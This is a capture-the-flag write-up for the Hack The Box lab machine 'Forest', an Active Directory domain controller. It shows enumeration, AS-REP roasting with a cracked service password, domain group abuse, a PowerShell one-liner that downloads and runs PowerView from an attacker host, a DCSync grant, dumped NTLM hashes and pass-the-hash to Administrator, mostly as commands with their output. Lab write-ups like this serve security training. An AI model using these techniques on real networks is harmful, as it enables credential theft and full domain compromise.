@@ -1,0 +1,339 @@
+<h1 id="forest">Forest</h1>
+
+<h1 id="skills">Skills</h1>
+
+<ul>
+  <li>Users enumeration (ldap or rpc)</li>
+  <li>ASP-Roast attack</li>
+  <li>DCSync Attack (Privilege Escalation)</li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>This first scanner with nmap reports a good number of ports opened</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host: 10.10.10.161 <span class="o">()</span>   Status: Up
+Host: 10.10.10.161 <span class="o">()</span>   Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49671/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49684/open/tcp/////, 49706/open/tcp/////
+</code></pre></div></div>
+
+<p>A more in deep analysis with NMAP doesn’t report much more</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      REASON  VERSION
+53/tcp    open  domain       syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-09-17 06:57:44Z<span class="o">)</span>
+135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsof   syn-ack Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?    syn-ack
+593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped   syn-ack
+3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped   syn-ack
+5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
+47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
+Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-09-17T06:58:34
+|_  start_date: 2023-09-17T06:52:30
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_clock-skew: mean: 2h26m50s, deviation: 4h02m29s, median: 6m49s
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 32753/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 44879/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 44587/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 44051/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System <span class="nb">time</span>: 2023-09-16T23:58:33-07:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="crackmapexec">CRACKMAPEXEC</h2>
+
+<p>With this tools we are able to get a domain name → <strong>HTB.local</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="dns">DNS</h2>
+
+<p>The enumeration of the DNS server doesn’t provide very useful information. Neither we see new domains nor hidden records (MX, AAAA, A, SOA). Zone transfer attack doesn’t work either.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig axfr htb.local @10.10.10.161
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.16-1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr htb.local @10.10.10.161
+<span class="p">;;</span> global options: +cmd
+<span class="p">;</span> Transfer failed.
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<p>We are not able to connect to any SMB, guests session are allowed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span>  <span class="se">\\\\</span>10.10.10.161<span class="se">\\</span> 
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.161 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h2 id="ldap">LDAP</h2>
+
+<p>We will try to bind with the LDAP server and see if we can retrieve any information from there.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.161 <span class="nt">-b</span> <span class="s2">"DC=htb,DC=local"</span>
+</code></pre></div></div>
+
+<p>With the above command it seems like we can connect successfully with LDAP. Although there is a lot of useful information there, it is complicated to analyse it easily. Since we don’t know the full LDAP tree we need another way to enumerate it.</p>
+
+<p>We can use the tool called windapsearch to enumerate LDAP more easily.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windapsearch.py <span class="nt">-d</span> htb.local <span class="nt">--dc-ip</span> 10.10.10.161 <span class="nt">-U</span>
+<span class="o">[</span>+] No username provided. Will try anonymous bind.
+<span class="o">[</span>+] Using Domain Controller at: 10.10.10.161
+<span class="o">[</span>+] Getting defaultNamingContext from Root DSE
+<span class="o">[</span>+]     Found: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>
+<span class="o">[</span>+] Attempting <span class="nb">bind</span>
+<span class="o">[</span>+]     ...success! Binded as: 
+<span class="o">[</span>+]      None
+
+<span class="o">[</span>+] Enumerating all AD <span class="nb">users</span>
+<span class="o">[</span>+]     Found 30 <span class="nb">users</span>:
+
+cn: Sebastien Caron
+userPrincipalName: sebastien@htb.local
+
+cn: Lucinda Berger
+userPrincipalName: lucinda@htb.local
+
+cn: Andy Hislip
+userPrincipalName: andy@htb.local
+
+cn: Mark Brandt
+userPrincipalName: mark@htb.local
+
+cn: Santi Rodriguez
+userPrincipalName: santi@htb.local
+
+</code></pre></div></div>
+
+<p>We have a good number of users, but we will continue with the enumeration.</p>
+
+<h2 id="rdp">RDP</h2>
+
+<p>We are going to try a connection with the RDP service and see if we can get information from there.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.10.10.161
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span><span class="o">]</span> rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+user:[john] rid:[0x2583]
+</code></pre></div></div>
+
+<p>We can connect and we know have a list of domain users, with their RID. Actually, we can enumerate also other thigs such as groups.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>With a list of users we can know perform a ASP-Roast Attack. The vulnerability here is in the UF_DONT_REQUIRE_PREAUTH switch that disable the pre-auth in Kerberos, giving us the posibility to obtain a TGT from a user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/doc/python3-impacket/examples/GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.161 htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> domusers.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User sebastien doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:c3a6d1a4684e2ceea425de0982e36be2<span class="nv">$70f4b4147292e0ba12be0ad377993dd65b82dc93c30bfd9ada3d5d112357d7f0d92953019f03afd3bf1472b3a38105bd9f082560432c53a3ca4ef5b81a1d749de397ea0f5345d830fc0d59c4bd379bc7eb8e00d8c3ed1b571aaa60d98c3de3764db588e0b0ba8c98dd180fbd7be01319f5a7f0f1ab1057a6c9d02bd1cb981d2bd885b50b75b157fc6b39b45bf5243b305c9ed61a2dea95ff5f0136ff218208556eccffdda0b0263bf076aaef2d45c46764521d5b00cd62089fa9fc5545e8a7e8aafe7673e9b5853ec138217b67df89562c68bf20f55a434c02b9962ae41a939bf738b5f219db</span>
+<span class="o">[</span>-] User andy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User santi doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User Administrator doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can see a hash for the user <strong>svc-alfresco</strong> which can be cracked using Hashcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 18200 svc-alfresco_asproast.hash /usr/share/wordlists/rockyou.txt
+Dictionary cache hit:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344386
+<span class="k">*</span> Bytes.....: 139921515
+<span class="k">*</span> Keyspace..: 14344386
+
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:aed07bb35969f887301f309d9af57f04<span class="nv">$98e9a1b121b215b94fe0c37be6e7229f4643ff5aba17093c2efa03a21d5a157977ed41589fd0081c2015eeef374458479210163ff80bef86b8e15dcffaad9f8dc7a1bfb5bf626da3a119517ede3110df286e00e9915015249d206dc2f1db6387b7d386b5c4bb9d4d9403305da2af1f6c103306534646e1437375eae1ac1c98336f21c14d1da7fb44fa604e11c5ff092622aa203cf51eb9cb3c0344418e692eeaf5ca0f2ee7524ce2221c30ed5ca62a04b3b05f05e2d98bdf2537a0ee68570b325be49aec1e03b10c0383599baa8866ec3e92cd92ebe370ea654ccd3a789a3c9c7adeaeac6415</span>:s3rvice
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 <span class="o">(</span>Kerberos 5, etype 23, AS-REP<span class="o">)</span>
+Hash.Target......: <span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:aed07bb35969f8...ac6415
+Time.Started.....: Sun Sep 17 17:07:07 2023 <span class="o">(</span>4 secs<span class="o">)</span>
+Time.Estimated...: Sun Sep 17 17:07:11 2023 <span class="o">(</span>0 secs<span class="o">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:  1013.3 kH/s <span class="o">(</span>0.44ms<span class="o">)</span> @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+Progress.........: 4085760/14344386 <span class="o">(</span>28.48%<span class="o">)</span>
+Rejected.........: 0/4085760 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 4084736/14344386 <span class="o">(</span>28.48%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: s456838 -&gt; s3r3nity1
+Hardware.Mon.#1..: Util: 38%
+</code></pre></div></div>
+
+<p>Finally we can use crackmapexec to check if the credentials are valid.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s2">"svc-alfresco"</span> <span class="nt">-p</span> <span class="s2">"s3rvice"</span>
+SMB         10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We have know a foothold in the DC.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>To see our ways to escalate privilege we will use BloodHound to visualize all the different ways to do it. First of all we will recover as much information as we can with <strong>bloodhound-python</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound-python <span class="nt">-ns</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice <span class="nt">-d</span> htb.local <span class="nt">-c</span> all
+INFO: Found AD domain: htb.local
+INFO: Getting TGT <span class="k">for </span>user
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 32 <span class="nb">users
+</span>INFO: Found 76 <span class="nb">groups
+</span>INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done <span class="k">in </span>00M 22S
+</code></pre></div></div>
+
+<p>Then we will import this to BloodHound and look for ways to escalate privilege. If we check in what groups our user is part of, we see that he is in the <strong>Account Operators</strong> group.</p>
+
+<p><img src="/images/blood.png" alt="Untitled" /></p>
+
+<p>This group has a GenericAll relationship with <strong>Exchange Windows Permissions</strong>, what means that we can add any user to that group, actually GenericAll relationship gives us full access over that group. In addition we can create new domain users, since we are part of Account Operators. Members of <strong>Exchange Windows Permission</strong> can control the rights and add new permissions to users in the domain since they have the relationship <strong>WriteDacl</strong> with the whole domain.</p>
+
+<ul>
+  <li>First we create a new user</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user centesiman cente234! /add /domain
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Secondly we add this new user to <strong>Exchange Windows Permission</strong> group</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group <span class="s1">'Exchange Windows Permissions'</span> centesiman /add
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<p>In order to escalate privilege we have perform a DCSync Attack as Bloodhound suggests. This attack consists in giving a user DCSync rights, which will allow us to dump the SAM from the DC.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'cente234!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+<span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'htb.local\centesiman'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>In order to give this new user the DCSync right we need a tool from PowerView.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://10.10.14.17/PowerView.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Finally, we can give this new user the proper rights.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-PrincipalIdentity</span> centesiman <span class="nt">-Rights</span> DCSync
+</code></pre></div></div>
+
+<p>This allow us to dump the SAM of the DC and get all the NTLM hashes, including the hash of the administrator user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/centesiman:<span class="s1">'cente234!'</span>@10.10.10.161 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+</code></pre></div></div>
+
+<p>With the NTML hash of the administrator user we can login to the machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">-u</span> <span class="s2">"administrator"</span> <span class="nt">-H</span> <span class="s2">"aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"</span>             
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\a</span>dministrator:32693b11e6aa90eb43d32c72a07ceea6 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
